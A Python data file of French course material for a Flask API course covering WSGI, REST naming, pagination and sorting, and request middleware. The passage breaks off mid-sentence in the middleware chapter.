"""
Manuel de Référence Approfondi — Enrichissement des Chapitres (Jours 2 et 3).
Volume I — Architecture & Ingénierie des APIs Web avec Python, Flask et WSGI.
"""

ENRICHMENT_D2_D3 = {
    # =========================================================================
    # JOUR 2 — CHAPITRE 2.1 : SERVEUR MINIMAL FLASK, WSGI & TABLE DE ROUTAGE
    # =========================================================================
    "d2-l1": {
        "context": (
            "Après avoir établi le modèle mémoire de Python (Jour 0) et la mécanique sur le fil du protocole HTTP/1.1 "
            "(Jour 1), nous assemblons notre premier serveur d'API avec **Flask**.\n\n"
            "Si Flask s'est imposé mondialement comme la référence pédagogique et industrielle pour comprendre "
            "l'architecture Web en Python, c'est grâce à sa philosophie de *micro-framework* explicite bâtie sur la "
            "bibliothèque HTTP **Werkzeug** et le moteur **Jinja2** : aucune génération de code opaque ne vient masquer "
            "le trajet des octets. Ce chapitre explique comment un processus Python ordinaire se mue en un **démon "
            "réseau permanent**, comment le contrat **WSGI (PEP 3333)** découple le serveur réseau de votre logique "
            "métier, et comment Flask aiguille chaque URI entrante via sa table de routage compilée `app.url_map`."
        ),
        "deep_sections": [
            {
                "heading": "1. Du script séquentiel éphémère au démon d'écoute Socket permanent",
                "body": (
                    "Un script Python classique s'exécute linéairement de la première à la dernière instruction, puis "
                    "rend la main au système d'exploitation qui détruit immédiatement le processus et libère sa mémoire. "
                    "Un serveur d'API obéit à un cycle de vie radicalement différent : il doit demeurer **résident en "
                    "mémoire 24h/24** sous forme de démon (*daemon*) prêt à traiter des connexions à tout instant.\n\n"
                    "Lorsque le bloc `if __name__ == \"__main__\":` invoque `app.run(host=\"0.0.0.0\", port=5000)` en "
                    "développement (ou lorsque Gunicorn prend le relais en production), le serveur invoque les appels "
                    "système POSIX `socket()`, `bind()` et `listen()` du noyau Linux pour réserver le port TCP `5000`. "
                    "Il entre ensuite dans une **boucle d'événements infinie** bloquée sur l'appel `accept()` : tant "
                    "qu'aucun client ne se présente, le processus consomme zéro pour cent de CPU. Dès qu'une poignée de "
                    "main TCP aboutit, le serveur lit la trame HTTP brute sur le descripteur client, résout la fonction "
                    "Python cible, forge la trame de réponse HTTP, referme (ou recycle en *Keep-Alive*) la transaction, "
                    "et retourne immédiatement écouter la requête suivante."
                )
            },
            {
                "heading": "2. Le contrat d'interface WSGI (Web Server Gateway Interface — PEP 3333)",
                "body": (
                    "Avant 2003, chaque framework Web Python était prisonnier d'un serveur HTTP particulier : changer de "
                    "serveur obligeait à réécrire toute l'application. Publiée par Phillip J. Eby sous la référence "
                    "**PEP 3333**, la spécification **WSGI** a unifié tout l'écosystème synchrone Python autour d'une "
                    "signature d'appel minimaliste et universelle entre le **Serveur HTTP** (Gunicorn, uWSGI, mod_wsgi, "
                    "Werkzeug) et l'**Application Python** (`app = Flask(__name__)`).\n\n"
                    "> « L'interface application WSGI est implémentée sous la forme d'un objet appelable (callable) acceptant exactement deux arguments positionnels : un dictionnaire d'environnement CGI enrichi `environ` et une fonction de rappel `start_response`. » — Python Enhancement Proposal 3333 (WSGI 1.0.1)\n\n"
                    "```python — Signature brute PEP 3333 exécutée sous chaque appel Flask\n"
                    "def application_wsgi(environ: dict, start_response):\n"
                    "    # environ contient REQUEST_METHOD, PATH_INFO, QUERY_STRING, wsgi.input...\n"
                    "    corps_octets = b'{\"statut\": \"operationnel\"}'\n"
                    "    start_response(\"200 OK\", [\n"
                    "        (\"Content-Type\", \"application/json; charset=utf-8\"),\n"
                    "        (\"Content-Length\", str(len(corps_octets))),\n"
                    "    ])\n"
                    "    return [corps_octets]\n"
                    "```\n\n"
                    "Votre instance `app = Flask(__name__)` est très exactement un tel objet appelable WSGI (`app.__call__`). "
                    "Lorsque Gunicorn reçoit une requête, il peuple le dictionnaire `environ` (`REQUEST_METHOD=\"GET\"`, "
                    "`PATH_INFO=\"/api/v1/modules\"`, `HTTP_AUTHORIZATION=\"Bearer ...\"`, ainsi que le flux binaire "
                    "`wsgi.input`), puis appelle `app(environ, start_response)`. Flask enveloppe ce dictionnaire brut dans "
                    "l'objet ergonomique `flask.request`, consulte `app.url_map` pour trouver l'endpoint correspondant au "
                    "couple `(Chemin, Verbe HTTP)`, exécute votre fonction et restitue les octets de réponse à Gunicorn."
                )
            },
            {
                "heading": "3. Différence contractuelle décisive entre `jsonify()` et `json.dumps()`",
                "body": (
                    "Une erreur subtile mais fréquente consiste à retourner directement `return json.dumps({\"statut\": \"OK\"})` "
                    "depuis une fonction de route Flask. Aux yeux de Flask, `json.dumps()` ne renvoie qu'une chaîne `str` "
                    "ordinaire, indiscernable d'un fragment de page Web : par convention historique, Flask l'encapsule alors "
                    "avec l'en-tête erroné **`Content-Type: text/html; charset=utf-8`** ! Les clients stricts (applications "
                    "mobiles typées, passerelles d'API, tests OpenAPI) refuseront alors de décoder la réponse comme du JSON.\n\n"
                    "À l'inverse, invoquer **`jsonify({...})`** orchestre trois opérations atomiques conformes à la RFC 8259 : "
                    "il sérialise votre structure en octets UTF-8 valides, instancie un véritable objet `flask.Response` "
                    "calculant son `Content-Length`, et positionne systématiquement l'en-tête normatif "
                    "**`Content-Type: application/json`**.\n\n"
                    "> [!TIP] Garde d'exécution `if __name__ == \"__main__\":` et tests unitaires\n"
                    "> Encapsulez toujours l'appel bloquant `app.run(...)` derrière la condition `if __name__ == \"__main__\":`. Ainsi, lorsque `gunicorn wsgi:app` ou votre suite de tests `pytest` importe votre fichier Python comme un module (`__name__` vaut alors le nom du module et non `\"__main__\"`), l'objet `app` est chargé proprement en mémoire sans bloquer le processus dans une boucle réseau parasite."
                )
            }
        ],
        "architecture_diagram": (
            "CYCLE D'AIGUILLAGE D'UNE REQUÊTE DANS FLASK (WSGI & URL_MAP)\n"
            "  Client HTTP (GET /api/v1/sante)\n"
            "        |\n"
            "        v\n"
            "  [Socket TCP :5000 (Werkzeug / Gunicorn)]\n"
            "        |  (Construit le dictionnaire WSGI 'environ')\n"
            "        v\n"
            "  [app = Flask(__name__)] ---> Consulte app.url_map :\n"
            "                                 - '/api/v1/sante'      [GET] -> etat_sante()\n"
            "                                 - '/api/v1/formations' [GET] -> lister()\n"
            "        |\n"
            "        v\n"
            "  Exécute etat_sante() ---> jsonify({...}), 200 ---> Réponse HTTP/1.1 200 OK (Content-Type: application/json)"
        ),
        "reference_table": {
            "title": "Composants Fondamentaux d'une Application Flask Minimale",
            "headers": ["Élément de code", "Rôle technique exact", "Que se passe-t-il si on l'omet ?"],
            "rows": [
                ["`app = Flask(__name__)`", "Instancie l'application WSGI et initialise `app.url_map`", "Impossible de déclarer des routes `@app.route`"],
                ["`@app.route(\"/url\", methods=[\"GET\"])`", "Enregistre le couple `(URL, Méthodes)` dans la table de routage", "La fonction reste une fonction Python ordinaire inaccessible par HTTP (`404`)"],
                ["`jsonify(dictionnaire)`", "Sérialise en JSON + ajoute `Content-Type: application/json`", "Si on renvoie `json.dumps()`, l'en-tête sera `text/html` au lieu de `application/json`"],
                ["`if __name__ == \"__main__\":`", "N'exécute `app.run()` que si le fichier est lancé directement", "Le serveur démarrerait de manière intempestive lors d'un simple `import` pour les tests"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Nommer son propre fichier `flask.py` dans le dossier de travail",
                "good": "Nommer ses fichiers `app.py`, `serveur.py` ou `01_serveur_minimal_flask.py`",
                "why": "Si votre fichier s'appelle `flask.py`, l'instruction `from flask import Flask` importera votre propre fichier au lieu de la bibliothèque Flask (`ImportError: cannot import name 'Flask'`) !"
            },
            {
                "bad": "Donner exactement le même nom Python `def ma_route():` à deux routes `@app.route` différentes",
                "good": "Donner un nom de fonction explicite et unique à chaque route (`lister_formations`, `creer_formation`)",
                "why": "Flask utilise le nom de la fonction comme identifiant interne d'endpoint (`AssertionError: View function mapping is overwriting an existing endpoint`)."
            }
        ],
        "practical_exercises": [
            "Exécutez le script dans l'atelier ci-dessus afin d'inspecter les règles compilées à l'intérieur de `app.url_map` ainsi que les méthodes automatiques (`HEAD`, `OPTIONS`) ajoutées par Werkzeug.",
            "Déclarez une troisième route `@app.route(\"/api/v1/version\", methods=[\"GET\"])` retournant un tuple `(jsonify(...), 200)` et vérifiez son enregistrement immédiat dans la table de routage."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.2 : MATURITÉ REST (RICHARDSON) & PARAMÈTRES D'URL
    # =========================================================================
    "d2-l2": {
        "context": (
            "Exposer une URL `/api/recupererListeFormationsActives` qui renvoie du JSON ne suffit nullement à bâtir "
            "une architecture **RESTful** gouvernable. Sans grammaire de nommage rigoureuse, un catalogue d'entreprise "
            "dérive en quelques mois vers des centaines de routes RPC incohérentes que personne ne parvient plus à "
            "documenter ni à mettre en cache.\n\n"
            "Comment les grandes plateformes d'ingénierie (Stripe, GitHub, Google Cloud, Twilio) structurent-elles "
            "leurs espaces d'URI pour qu'un intégrateur externe devine intuitivement le comportement de toute l'API ? "
            "Et comment distinguer sans hésitation un paramètre de chemin (`/formations/42`) d'un paramètre de requête "
            "(`?salle=Alger`), ou encore les notations `<id>`, `:id` et `{id}` selon l'outil utilisé ? Ce chapitre "
            "établit le **Modèle de Maturité de Richardson** et la mécanique de routage typé de Werkzeug/Flask."
        ),
        "deep_sections": [
            {
                "heading": "1. Le Modèle de Maturité de Leonard Richardson : du tunnel RPC au standard REST Niveau 2",
                "body": (
                    "Formulé en 2008 par Leonard Richardson et popularisé par Martin Fowler, ce modèle gradué de **Niveau 0 "
                    "à Niveau 3** permet d'auditer objectivement le degré d'alignement d'une API avec l'architecture du Web.\n\n"
                    "#### Les quatre échelons d'architecture d'une API HTTP\n\n"
                    "Au **Niveau 0 (*The Swamp of POX* / Tunnel RPC)**, le protocole HTTP est réduit à un simple tuyau de "
                    "transport : l'application n'expose qu'une unique adresse telle que `POST /api/service` à laquelle les "
                    "clients envoient des enveloppes disparates `{\"action\": \"lireFormation\", \"id\": 5}` puis "
                    "`{\"action\": \"supprimerFormation\", \"id\": 5}` en répondant systématiquement `200 OK`. Au **Niveau 1 "
                    "(Ressources nominales)**, l'architecte découpe le domaine métier en **noms communs au pluriel** dotés "
                    "chacun d'une identité URI propre (`/api/v1/formations`, `/api/v1/formations/42`), mais continue souvent "
                    "de tout véhiculer via `GET` ou `POST`.\n\n"
                    "Le **Niveau 2 (Verbes HTTP + Codes de Statut sémantiques)** constitue le **standard industriel de "
                    "référence** visé par la quasi-totalité des APIs REST modernes : l'URI désigne exclusivement le **nom** "
                    "de la ressource (`/api/v1/formations/42`, sans aucun verbe dans l'URL !), la méthode HTTP qualifie "
                    "**l'action** (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`), et le code de statut exprime **l'issue exacte** "
                    "(`200`, `201`, `204`, `400`, `404`, `409`, `422`). Enfin, le **Niveau 3 (HATEOAS — *Hypermedia As The "
                    "Engine Of Application State*)** enrichit chaque représentation de liens de navigation découvrables "
                    "(`\"links\": {\"self\": \"/api/v1/formations/42\", \"inscriptions\": \"/api/v1/formations/42/stagiaires\"}`) "
                    "guidant dynamiquement le client à travers les transitions d'état permises."
                )
            },
            {
                "heading": "2. Arbitrage structurel : Paramètres de Chemin (`<int:id>`) vs Query String (`request.args`)",
                "body": (
                    "Une règle de décision limpide gouverne le placement d'une variable dans l'URI. Tout identifiant qui "
                    "**désigne de façon unique une ressource ou sous-ressource hiérarchique obligatoire** appartient au "
                    "**chemin (*Path Parameter*)** : `/api/v1/formations/<int:formation_id>`. Dans Flask, le convertisseur "
                    "`<int:...>` de Werkzeug compile une expression régulière typée dans `url_map` : si le client appelle "
                    "`/api/v1/formations/abc`, le routeur rejette la requête en `404 Not Found` avant même d'entrer dans "
                    "votre fonction ; s'il appelle `/api/v1/formations/42`, votre fonction reçoit directement l'entier `42` "
                    "déjà converti en `int`.\n\n"
                    "À l'inverse, tout critère optionnel servant à **filtrer, trier, rechercher ou paginer** une collection "
                    "appartient à la **chaîne de requête (*Query Parameter*)** située après `?` : "
                    "`/api/v1/formations?salle=Alger&duree_min=3`.\n\n"
                    "> [!IMPORTANT] Collection filtrée vide (`200 OK` + `[]`) vs Ressource absente (`404 Not Found`)\n"
                    "> Si `GET /api/v1/formations/999` cible un identifiant inexistant, la ressource désignée n'existe pas : le serveur **doit** renvoyer `404 Not Found`. En revanche, si `GET /api/v1/formations?salle=Tamanrasset` ne trouve aucun stage correspondant au filtre, la collection `/formations` existe parfaitement ! Le serveur **doit** alors renvoyer `200 OK` contenant une liste vide `{\"meta\": {\"total\": 0}, \"data\": []}`."
                )
            },
            {
                "heading": "3. Extraction défensive et coercition de type avec `request.args.get(..., type=...)`",
                "body": (
                    "Sur le protocole HTTP, les paramètres de la Query String (`?duree_min=3&ht=2500.50`) ne possèdent aucun "
                    "typage intrinsèque : `request.args` (une instance `ImmutableMultiDict` de Werkzeug) stocke initialement "
                    "des chaînes de caractères. Écrire manuellement des blocs `try / except ValueError:` autour de chaque "
                    "paramètre d'URL alourdirait considérablement les contrôleurs.\n\n"
                    "```python — Coercition typée sécurisée avec repli automatique dans Flask\n"
                    "duree_min = request.args.get(\"duree_min\", default=1, type=int)\n"
                    "montant_ht = request.args.get(\"ht\", default=1000.0, type=float)\n"
                    "```\n\n"
                    "En passant le callable `type=int` ou `type=float` à `request.args.get()`, Werkzeug tente la conversion "
                    "en interne : si un utilisateur maladroit envoie `?duree_min=trois`, l'exception `ValueError` est "
                    "interceptée proprement et la variable reçoit la valeur de repli `default=1` sans provoquer de panne."
                )
            },
            {
                "heading": "4. Concordance des notations industrielles : `<variable>` vs `:variable` vs `{variable}`",
                "body": (
                    "En naviguant entre le code Python d'un serveur Flask, une collection Postman et un portail Swagger UI, "
                    "les ingénieurs rencontrent trois syntaxes distinctes pour exprimer très exactement le même concept de "
                    "**variable de segment de chemin**. Confondre ces notations est un piège classique en début de projet.\n\n"
                    "Dans le code serveur **Flask / Werkzeug** (ainsi que Django), on utilise exclusivement les **chevrons "
                    "`<convertisseur:nom>`** tels que `@app.route(\"/api/v1/formations/<int:id>\")` : ce délimiteur a été "
                    "retenu pour loger élégamment le nom du convertisseur (`int`, `float`, `uuid`, `path`, `string`) devant "
                    "les deux-points. Dans **Postman**, **Express.js (Node.js)**, **Ruby on Rails** ou **Gin (Go)**, la "
                    "convention historique emploie le préfixe **deux-points `:id`** (`/api/v1/formations/:id`, qui peuple "
                    "automatiquement le tableau *Path Variables* de Postman). Enfin, la norme **OpenAPI 3.0 / Swagger** "
                    "(conforme au standard **IETF RFC 6570 *URI Template***), **FastAPI**, **Spring Boot** et les *f-strings* "
                    "Python adoptent les **accolades `{id}`** (`/api/v1/formations/{id}`).\n\n"
                    "> [!WARNING] Ne copiez jamais `:id` ou `{id}` dans `@app.route(...)` sous Flask\n"
                    "> Si vous déclarez par inadvertance `@app.route(\"/api/v1/formations/:id\")` dans Flask en recopiant une URL Postman, Werkzeug interprète les trois caractères `:id` comme une chaîne statique littérale ! Tout appel réel vers `/api/v1/formations/42` se soldera alors par une erreur `404 Not Found`."
                )
            }
        ],
        "architecture_diagram": (
            "1. COMPARAISON ARCHITECTURALE : ANTI-PATTERN RPC vs STANDARD REST (NIVEAU 2)\n"
            "  [ANTI-PATTERN RPC]                       [STANDARD RESTFUL (Noms au pluriel + Verbes HTTP)]\n"
            "  GET  /api/getAllFormations       ===>    GET    /api/v1/formations\n"
            "  GET  /api/getFormationById?id=5  ===>    GET    /api/v1/formations/5\n"
            "  POST /api/createNewFormation     ===>    POST   /api/v1/formations\n"
            "  POST /api/updateFormation/5      ===>    PUT    /api/v1/formations/5\n"
            "  GET  /api/deleteFormation?id=5   ===>    DELETE /api/v1/formations/5\n\n"
            "2. TRADUCTION D'UNE VARIABLE DE CHEMIN SELON L'OUTIL :\n"
            "  - Dans le code serveur Flask   : @app.route(\"/api/v1/formations/<int:id>\")   <-- Chevrons <...>\n"
            "  - Dans l'interface Postman     : GET http://.../api/v1/formations/:id        <-- Deux-points :id\n"
            "  - Dans OpenAPI / FastAPI       : GET /api/v1/formations/{id}                 <-- Accolades {...}\n"
            "  - Dans curl / Navigateur       : curl http://.../api/v1/formations/42        <-- Valeur réelle 42"
        ),
        "reference_table": {
            "title": "Synthèse : Lecture avec `flask.request` & Notations des Variables d'URL (`<var>` vs `:var` vs `{var}`)",
            "headers": ["Élément / Syntaxe", "Où est-il utilisé ?", "Exemple concret", "Comportement & Règle d'or"],
            "rows": [
                ["`<variable>` / `<int:id>`", "**Flask (Werkzeug)** & Django", "`@app.route('/api/formations/<int:id>')`", "Valide le type (`int`, `float`, `uuid`, `string`) et passe `id` en argument à la fonction Python"],
                ["`:variable` (ex. `:id`)", "**Postman**, Express.js (Node), Rails, Go Gin", "`/api/formations/:id`", "Crée une variable de chemin dans Postman/Express, mais **n'est pas reconnu par Flask** !"],
                ["`{variable}` (ex. `{id}`)", "**OpenAPI 3.0 (Swagger)**, FastAPI, f-string", "`/api/formations/{id}`", "Standard officiel de documentation d'API (RFC 6570) et du framework FastAPI"],
                ["`request.args`", "Query String (après `?`)", "`GET /api/formations?salle=Alger&page=2`", "`request.args.get(\"page\", 1, type=int)`"],
                ["`request.headers`", "En-têtes HTTP (`Headers`)", "`X-API-Key: secret`", "`request.headers.get(\"X-API-Key\", \"\")`"],
                ["`request.get_json()`", "Corps (`Body` JSON)", "`{\"titre\": \"Flask\", \"jours\": 5}`", "`corps = request.get_json(silent=True) or {}`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écrire `@app.route('/api/formations/:id')` dans un serveur Python Flask en copiant une documentation Postman ou Node.js",
                "good": "Toujours utiliser les chevrons `@app.route('/api/formations/<int:id>')` dans Flask",
                "why": "Dans Flask, `:id` sans chevrons est traité comme les 3 caractères littéraux `':id'` et non comme une variable dynamique (`GET /api/formations/1` renverra `404`)."
            },
            {
                "bad": "Mettre des verbes d'action dans les URLs : `/api/creer_formation`, `/api/listerFormations`",
                "good": "Utiliser uniquement des noms de ressources au pluriel (`/api/formations`) et laisser le verbe HTTP (`POST`, `GET`) définir l'action",
                "why": "Respecter le Niveau 2 de Richardson évite la prolifération de centaines d'URLs incohérentes."
            },
            {
                "bad": "Renvoyer `404 Not Found` lorsqu'une recherche filtrée `GET /api/formations?salle=Tamanrasset` ne trouve aucun résultat",
                "good": "Renvoyer `200 OK` avec `{\"total\": 0, \"formations\": []}`",
                "why": "`404` sur une collection ferait croire au client que la route `/api/formations` n'existe plus ; une liste vide `[]` indique clairement qu'il n'y a aucun résultat pour ce filtre."
            }
        ],
        "practical_exercises": [
            "Dans l'exécuteur ci-dessus, faites varier le contexte simulé `test_request_context` pour tester simultanément un paramètre de chemin non numérique (`/api/v1/stagiaires/abc`) et une Query String complète.",
            "Interrogez l'endpoint réel `GET /api/sandbox/calcul-tva?ht=2500&taux=19` depuis le Client HTTP intégré en testant également ce qui se produit lorsque `taux` est omis."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.3 : PAGINATION (OFFSET/LIMIT), FILTRAGE & TRI
    # =========================================================================
    "d2-l3": {
        "context": (
            "Sur le poste d'un développeur travaillant avec un jeu d'essai de cinq enregistrements, exécuter une "
            "lecture intégrale `SELECT * FROM formations` et sérialiser la totalité de la liste répond en moins "
            "d'une milliseconde. Dix-huit mois après le passage en production, lorsque la table des écritures "
            "comptables ou des inscriptions cumule **deux millions de lignes**, cette même route non bornée devient "
            "une arme d'auto-destruction massive.\n\n"
            "Une seule requête `GET` sans plafond force le travailleur Python à matérialiser deux millions de "
            "dictionnaires sur le tas mémoire, assemble une chaîne JSON de plusieurs centaines de mégaoctets, sature "
            "la bande passante sortante et déclenche l'*Out-Of-Memory (OOM) Killer* du noyau Linux qui abat le "
            "processus Gunicorn en plein vol. En ingénierie d'API, **aucun endpoint de collection ne part en "
            "production sans le triptyque Filtrage, Tri sur liste blanche et Pagination bornée**."
        ),
        "deep_sections": [
            {
                "heading": "1. Algèbre de la pagination par tranche (`page` / `limit` → `offset`) et division plafond",
                "body": (
                    "La pagination par numéro de page expose au client deux paramètres intuitifs dans la Query String : "
                    "**`page`** (indice humain de la page désirée, commençant par convention à `1`) et **`limit`** (ou "
                    "`per_page`, cardinalité maximale d'une tranche, par exemple `10` ou `20`). En interne, le serveur "
                    "convertit ces deux coordonnées en un **décalage d'origine zéro (`offset`)** grâce à la relation "
                    "fondamentale `offset = (page - 1) * limit`.\n\n"
                    "```python — Calcul exact des bornes de tranche et du nombre total de pages\n"
                    "page = max(1, request.args.get(\"page\", default=1, type=int))\n"
                    "limit = min(50, max(1, request.args.get(\"limit\", default=10, type=int)))\n"
                    "\n"
                    "total_items = len(resultats_filtres)\n"
                    "total_pages = max(1, (total_items + limit - 1) // limit)  # Plafond entier\n"
                    "offset = (page - 1) * limit\n"
                    "tranche = resultats_filtres[offset : offset + limit]\n"
                    "```\n\n"
                    "Ainsi, pour `limit = 10`, la `page = 1` produit `offset = 0` (indices `0` à `9`), la `page = 2` "
                    "produit `offset = 10` (indices `10` à `19`), et ainsi de suite. Pour déterminer `total_pages` sans "
                    "recourir aux flottants approximatifs, l'arithmétique entière `(total_items + limit - 1) // limit` "
                    "(strictement équivalente à `math.ceil(total_items / limit)` enveloppé d'un `max(1, ...)` lorsque la "
                    "liste est vide) fournit le nombre exact de pages nécessaires pour accueillir tous les éléments filtrés."
                )
            },
            {
                "heading": "2. Bornage défensif des paramètres (`Clamping`) contre le Déni de Service applicatif",
                "body": (
                    "Implémenter la pagination sans borner les valeurs fournies par l'appelant équivaut à installer une "
                    "porte blindée en laissant la clé sur la serrure. Si votre code se contente de lire "
                    "`limit = request.args.get(\"limit\", 10, type=int)`, un attaquant ou un script mal configuré n'a qu'à "
                    "appeler `GET /api/v1/formations?page=-3&limit=99999999` : un `page` négatif engendre un indice de "
                    "tranche Python négatif renvoyant la fin incohérente du tableau, tandis qu'un `limit` astronomique "
                    "reproduit instantanément l'épuisement mémoire que la pagination devait empêcher.\n\n"
                    "> [!IMPORTANT] Ordre immuable du pipeline de collection : Filtrer → Compter/Trier → Paginer\n"
                    "> Deux invariants d'ordre gouvernent tout pipeline de collection. Premièrement, on **filtre toujours avant de trier** afin de ne pas gaspiller du temps CPU à ordonner 100 000 lignes qui seront écartées par le prédicat `WHERE`. Deuxièmement, on calcule impérativement `total_items` **après le filtrage mais avant le découpage de la page** : calculer `len(tranche)` après le *slicing* renverrait la taille de la page (`10`) au lieu du nombre total de résultats trouvés (`248`), rendant tout composant graphique de pagination inutilisable."
                )
            },
            {
                "heading": "3. Gouvernance du tri dynamique par Liste Blanche (`Whitelist`) stricte",
                "body": (
                    "Offrir un tri dynamique via `?tri=duree_jours&ordre=desc` exige une vigilance particulière. Qu'il "
                    "s'agisse d'indexer un dictionnaire Python (`key=lambda x: x[champ_tri]`) ou a fortiori d'interpoler "
                    "une clause SQL `ORDER BY`, le serveur ne doit **jamais** obéir aveuglément au nom d'attribut envoyé "
                    "par le client : en Python, un attribut inexistant ou hétérogène lèvera `KeyError` ou `TypeError` ; en "
                    "SQL, une concaténation non filtrée dans `ORDER BY` ouvre une vulnérabilité critique d'injection SQL.\n\n"
                    "La parade canonique consiste à figer côté serveur un ensemble immuable de colonnes exposables au tri : "
                    "`CHAMPS_TRI_AUTORISES = (\"id\", \"duree_jours\", \"titre\")`. Toute valeur de `tri` absente de cette "
                    "liste blanche est immédiatement rejetée avec un statut `400 Bad Request` ou `422 Unprocessable Entity` "
                    "énumérant explicitement les clés permises."
                )
            }
        ],
        "architecture_diagram": (
            "PIPELINE DE TRAITEMENT D'UNE COLLECTION REST (GET /api/formations?salle=Alger&tri=duree_jours&ordre=desc&page=2&limit=2)\n\n"
            "  [Collection Complète (N éléments)] \n"
            "          |\n"
            "          v  1. FILTRAGE (?salle=Alger)\n"
            "  [Sous-ensemble filtré (total_items = 5)]\n"
            "          |\n"
            "          v  2. TRI SÉCURISÉ (?tri=duree_jours&ordre=desc via Whitelist)\n"
            "  [Sous-ensemble filtré et trié (5 éléments)]\n"
            "          |\n"
            "          v  3. DÉCOUPAGE PAGINATION (offset = (2-1)*2 = 2, tranche [2 : 4])\n"
            "  [Réponse JSON : {\"meta\": {\"total_items\": 5, \"page\": 2, \"total_pages\": 3, \"has_next\": true}, \"data\": [elem2, elem3]}]"
        ),
        "reference_table": {
            "title": "Structure Standard de l'Objet `meta` de Pagination dans une Réponse JSON",
            "headers": ["Clé JSON dans `meta`", "Type", "Formule de calcul en Python", "Utilité pour l'interface cliente (Web / Mobile)"],
            "rows": [
                ["`total_items`", "`int`", "`len(resultats_filtres)` ou `SELECT COUNT(*)`", "Afficher « 48 formations trouvées »"],
                ["`page`", "`int`", "`max(1, request.args.get('page', 1, type=int))`", "Mettre en surbrillance le numéro de page courant"],
                ["`limit`", "`int`", "`min(50, max(1, request.args.get('limit', 10, type=int)))`", "Connaître la taille de tranche appliquée"],
                ["`total_pages`", "`int`", "`max(1, (total_items + limit - 1) // limit)`", "Générer les boutons de pagination « Page 1 sur 5 »"],
                ["`has_next`", "`bool`", "`page < total_pages`", "Activer ou griser le bouton « Page suivante »"],
                ["`has_prev`", "`bool`", "`page > 1`", "Activer ou griser le bouton « Page précédente »"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Calculer `total_items` APRES avoir découpé la tranche `tranche = resultats[offset:offset+limit]`",
                "good": "Calculer `total_items = len(resultats)` sur les résultats filtrés AVANT le découpage de la page",
                "why": "Sinon `total_items` vaudra toujours `limit` (ex: 2) au lieu du nombre total réel d'enregistrements correspondant à la recherche !"
            },
            {
                "bad": "Trier AVANT de filtrer sur de grands volumes de données",
                "good": "Toujours **Filtrer d'abord**, puis **Trier**, puis **Paginer**",
                "why": "Trier 100 000 lignes pour n'en garder que 10 après filtrage gaspille 99 % du temps processeur."
            }
        ],
        "practical_exercises": [
            "Dans l'exécuteur Python ci-dessus, faites varier `page = 1`, `page = 2` puis `page = 99` avec `limit = 4` pour vérifier le comportement gracieux de la tranche Python hors bornes.",
            "Exécutez le scénario préconfiguré `GET /api/sandbox/formations?page=1&limit=2&tri=duree_jours&ordre=desc` et inspectez les compteurs de l'enveloppe `meta` retournée."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.4 : MIDDLEWARES (@BEFORE_REQUEST / @AFTER_REQUEST)
    # =========================================================================
    "d2-l4": {
        "context": (
            "Dès qu'un service backend dépasse quelques dizaines d'endpoints, des exigences transversales (*Cross-"
            "Cutting Concerns*) s'imposent uniformément à l'ensemble du catalogue : chronométrer la latence exacte "
            "de chaque appel à la microseconde près, attacher un identifiant de corrélation distribué (`X-Request-ID`), "
            "injecter les en-têtes de durcissement navigateur (`X-Content-Type-Options: nosniff`) et produire une "
            "ligne de journal d'audit normalisée.\n\n"
            "Dupliquer ces préoccupations techniques dans le corps de cinquante fonctions métier violerait frontalement "
            "le principe de responsabilité unique et condamnerait l'équipe à des oublis lors de chaque ajout de route. "
            "Flask résout élégamment cette problématique grâce à son **pipeline de hooks de cycle de vie** "
            "(`@app.before_request`, `@app.after_request`, `@app.teardown_request`) adossé au stockage isolé par "
            "contexte de requête `flask.g`."
        ),
        "deep_sections": [
            {
                "heading": "1. Orchestration du pipeline de requête dans Flask : Prétraitement, Vue et Post-traitement",
                "body": (
                    "Chaque requête HTTP prise en charge par Flask traverse une chaîne d'intercepteurs ordonnée en forme "
                    "d'oignon autour de votre fonction métier. En amont, toutes les fonctions enregistrées via "
                    "**`@app.before_request`** s'exécutent dans leur ordre de déclaration avant même l'appel de la route. "
                    "Cette phase possède un pouvoir décisif de **court-circuit** : si une fonction `before_request` ne "
                    "retourne rien (`None`), le pipeline poursuit normalement sa route vers la vue ; en revanche, si elle "
                    "retourne un objet `Response` ou un tuple `(jsonify(...), 403)` (par exemple en détectant un mode "
                    "maintenance ou une IP bannie), Flask interrompt immédiatement l'entrée et saute directement à la "
                    "phase de sortie sans jamais invoquer la fonction métier.\n\n"
                    "Une fois l'objet `Response` forgé, Flask parcourt les fonctions **`@app.after_request(reponse)`** : "
                    "chacune reçoit l'instance `Response` en paramètre, peut lire son statut ou enrichir son dictionnaire "
                    "`reponse.headers`, et **doit impérativement retourner l'objet `reponse`** à l'étape suivante. Enfin, "
                    "**`@app.teardown_request(exc)`** s'exécute de manière inconditionnelle en toute fin de cycle — même "
                    "si une exception fatale est survenue — pour restituer proprement les descripteurs système tels que "
                    "les connexions SQLite ou PostgreSQL."
                )
            },
            {
                "heading": "2. Concurrence multi-threads et isolation mémoire de `flask.g` (ContextVars)",
                "body": (
                    "Comment transmettre proprement l'instant de départ `heure_debut` mesuré dans `@app.before_request` "
                    "jusqu'à `@app.after_request` ? La tentation naïve d'utiliser une variable globale au niveau du module "
                    "(`HEURE_DEBUT = 0.0`) provoque un bogue redoutable de concurrence (*Race Condition*) dès que deux "
                    "utilisateurs interrogent un worker multi-threads au même instant : la requête B écrase la variable "
                    "globale pendant que la requête A attend une réponse SQL, faussant tous les chronométrages et pire "
                    "encore, mélangeant potentiellement les identités d'utilisateurs !\n\n"
                    "```python — Chronométrage monotone isolé par requête via flask.g\n"
                    "import time, uuid\n"
                    "from flask import g, request\n"
                    "\n"
                    "@app.before_request\n"
                    "def ouvrir_trace():\n"
                    "    g.debut = time.perf_counter()\n"
                    "    g.request_id = request.headers.get(\"X-Request-ID\") or f\"req-{uuid.uuid4().hex[:12]}\"\n"
                    "\n"
                    "@app.after_request\n"
                    "def sceller_trace(reponse):\n"
                    "    duree_ms = (time.perf_counter() - g.debut) * 1000.0\n"
                    "    reponse.headers[\"X-Request-ID\"] = g.request_id\n"
                    "    reponse.headers[\"X-Response-Time-Ms\"] = f\"{duree_ms:.2f}\"\n"
                    "    return reponse\n"
                    "```\n\n"
                    "Sous le capot, le mandataire (*proxy*) **`flask.g`** s'appuie sur le module standard `contextvars` "
